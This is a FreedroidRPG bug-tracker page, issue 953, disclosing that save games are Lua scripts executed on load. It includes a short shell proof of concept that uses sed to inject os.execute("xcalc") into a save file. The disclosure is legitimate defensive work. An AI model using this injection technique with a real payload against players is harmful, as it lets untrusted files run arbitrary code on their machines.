<!-- dollarId: issue.item,v 1.4 2001/08/03 01:19:43 richard Exp dollar-->
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<html>
<head>
<title>
Issue 953: Lua code execution in loading untrusted save game - FreedroidRPG issues

</title>

<link rel="stylesheet" title="Matthias Style"
      type="text/css" href="@@file/style_matthias.css">
<link rel="alternate stylesheet" title="Default" type="text/css" href="@@file/style_orig.css">
<link rel="alternate stylesheet" title="Style 2" type="text/css" href="@@file/style2.css">
<link rel="alternate stylesheet" title="Hail Style" type="text/css" href="@@file/style_hail.css">
<link rel="alternate stylesheet" title="Matthias Style" type="text/css" href="@@file/style_matthias.css">
<meta http-equiv="Content-Type"
      content="text/html; charset=utf-8" />

<script type="text/javascript">
submitted = false;
function submit_once() {
    if (submitted) {
        alert("Your request is being processed.\nPlease be patient.");
        event.returnValue = 0;    // work-around for IE
        return 0;
    }
    submitted = true;
    return 1;
}

function help_window(helpurl, width, height) {
    HelpWin = window.open('http://bugs.freedroid.org/b/' + helpurl, 'RoundupHelpWindow', 'scrollbars=yes,resizable=yes,toolbar=no,height='+height+',width='+width);
}
</script>



</head>
<body class="body">

<table class="body">

<tr>
 <td class="page-header-left">&nbsp;</td>
 <td class="page-header-top">
   <div id="searchbox">
     <form method="GET" action="issue">
       <input type="hidden" name="@columns"
              value="id,activity,title,creator,assignedto,status" />
       <input type="hidden" name="@sort" value="activity" />
       <input type="hidden" name="@group" value="priority" />
       <input id="search-text" name="@search_text" size="10" />
       <input type="submit" id="submit" name="submit"
              value="Search" />
     </form>
   </div>
   <div id="body-title">
     <h2>
 
 
 Issue953
 
</h2>
   </div>
 </td>
</tr>

<tr>
 <td rowspan="2" valign="top" class="sidebar">
  

  <form method="POST" action="http://bugs.freedroid.org/b/">
   <p class="classblock">
    <b>Issues</b><br>
    
<!--    <a href="#"
       tal:attributes="href python:request.indexargs_url('issue', {
      '@sort': '-activity',
      '@group': 'priority',
      '@filter': 'status,assignedto',
      '@columns': columns,
      '@search_text': '',
      'status': status_notresolved,
      'assignedto': '-1',
      '@dispname': i18n.gettext('Show Unassigned'),
     })"
       i18n:translate="">Show Unassigned</a><br>-->
    <a href="issue?status=-1,1,3,4&amp;@sort=-activity&amp;@search_text=&amp;@dispname=Show Not Resolved&amp;@filter=status&amp;@group=priority&amp;@columns=id,activity,title,creator,assignedto,status&amp;@pagesize=50&amp;@startwith=0">Show Not Resolved</a><br>
    <a href="issue?status=-1,1,2,3,4,5,6,7&amp;@sort=-activity&amp;@search_text=&amp;@dispname=Show All&amp;@filter=status&amp;@group=priority&amp;@columns=id,activity,title,creator,assignedto,status&amp;@pagesize=50&amp;@startwith=0">Show All</a><br>
    <a href="issue?@template=search">Search</a><br>
    <input type="submit" class="form-small"
           value="Show issue:"><input class="form-small" size="4" type="text" name="@number">
    <input type="hidden" name="@type" value="issue">
    <input type="hidden" name="@action" value="show">
   </p>
  </form>

  

  

  <form method="POST" action="http://bugs.freedroid.org/b/">
   <p class="userblock">
    <b>Login</b><br>
    <input size="10" name="__login_name"><br>
    <input size="10" type="password" name="__login_password"><br>
    <input type="hidden" name="@action" value="Login">
    <input type="checkbox" name="remember" id="remember">
    <label for="remember">Remember me?</label><br>
    <input type="submit" value="Login"><br>
    <input type="hidden" name="__came_from"
           value="http://bugs.freedroid.org/b/issue953">
    <input type="hidden" name="@sort" value="">
<input type="hidden" name="@group" value="">
<input type="hidden" name="@pagesize" value="50">
<input type="hidden" name="@startwith" value="0">
    <a href="user?@template=register">Register</a><br>
    <a href="user?@template=forgotten">Lost&nbsp;your&nbsp;login?</a><br>
   </p>
  </form>

  
  <p class="userblock">
   <b>Help</b><br>
   <a href="http://www.roundup-tracker.org">Roundup docs</a>
  </p>
 </td>
 <td>
  
 </td>
</tr>
<tr>
 <td class="content">





<div>

<form method="POST" name="itemSynopsis"
      onsubmit="return submit_once()"
      enctype="multipart/form-data" action="issue953">

<table class="form">
<tr>
 <th class="required">Title</th>
 <td colspan="3">Lua code execution in loading untrusted save game</td>
</tr>

<tr>
 <th class="required">Priority</th>
 <td>bug</td>
 <th>Status</th>
 <td>open</td>
</tr>

<tr>
 <th>Assigned To</th>
 <td></td>
 <th>Keywords</th>
 <td>
  
  
 </td>
</tr>

<tr>
 <th>Linked issues</th>
 <td>
  
  
  
 </td>
 <th>Watchers</th>
 <td>
  
  <br>
 </td>
</tr>







</table>
</form>



<p>Submitted on <b>2019-07-25&nbsp;14h00</b> by <b>mmmds</b>, last changed  by <b>fluzz</b>.</p>



<table class="messages">
 <tr><th colspan="5" class="header">Messages</th></tr>
 
<!-- <tr tal:condition="python:int(msg.id) == 1"><th colspan="4" class="header" i18n:translate="" >Description</th></tr>
 <tr tal:condition="python:int(msg.id) == 2"><th colspan="4" class="header" i18n:translate="">Comments</th></tr>-->
  <tr>
<!--   <th><a tal:attributes="href string:msg${msg/id}"
    i18n:translate="">#<tal:x replace="msg/id" i18n:name="id" /></a></th>-->
   <th>Author: <span class="msgauthor">mmmds</span></th>
   <th>Date: <span class="msgdate">2019-07-25&nbsp;&nbsp;&nbsp;14h00</span></th>
   <th>
<!--    <form style="padding:0" method="POST" tal:condition="python: context.is_edit_ok and request.user.hasRole('Admin')"
          tal:attributes="action string:issue${context/id}">
     <input type="hidden" name="@remove@messages" tal:attributes="value msg/id">
     <input type="hidden" name="@action" value="edit">
     <input type="submit" value="remove" i18n:attributes="value">
    </form>-->
   </th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    <pre>Save games files consist of Lua script to execute during load. Assuming that users may 
load malicious save games, for example downloaded or received from other users, 
arbitrary code may be executed on their machines.


savestruct_internal.c, void load_game_data(char *strin)

PoC:
CH="mmm"
gunzip $CH.sav.gz
sed -i -e '0,/^$/s/^$/os.execute("xcalc")/' $CH.sav
gzip $CH.sav

Loading the save will run xcalc.</pre>
    
   </td>
  </tr>

 
 
<!-- <tr tal:condition="python:int(msg.id) == 1"><th colspan="4" class="header" i18n:translate="" >Description</th></tr>
 <tr tal:condition="python:int(msg.id) == 2"><th colspan="4" class="header" i18n:translate="">Comments</th></tr>-->
  <tr>
<!--   <th><a tal:attributes="href string:msg${msg/id}"
    i18n:translate="">#<tal:x replace="msg/id" i18n:name="id" /></a></th>-->
   <th>Author: <span class="msgauthor">fluzz</span></th>
   <th>Date: <span class="msgdate">2020-06-29&nbsp;&nbsp;&nbsp;13h52</span></th>
   <th>
<!--    <form style="padding:0" method="POST" tal:condition="python: context.is_edit_ok and request.user.hasRole('Admin')"
          tal:attributes="action string:issue${context/id}">
     <input type="hidden" name="@remove@messages" tal:attributes="value msg/id">
     <input type="hidden" name="@action" value="edit">
     <input type="submit" value="remove" i18n:attributes="value">
    </form>-->
   </th>
  </tr>
  <tr>
   <td colspan="4" class="content">
    <pre>see <a href="issue967">issue967</a></pre>
    
   </td>
  </tr>

 
 
</table>

<table class="history"><tr><th colspan="4" class="header">
History
</th></tr><tr>
<th>Date</th>
<th>User</th>
<th>Action</th>
<th>Args</th>
</tr>
<tr><td>2020-06-29&nbsp;13:52:32</td><td>fluzz</td><td>set</td><td>messages:
  + <a href="msg3696">msg3696</a></td></tr>
<tr><td>2019-07-25&nbsp;14:00:46</td><td>mmmds</td><td>create</td><td></td></tr>
</table>

</div>

</td>
</tr>

</table>



</body>
</html>

<!-- SHA: a242ab3ed5c6969916f3c42f80d487710f165fb8 -->
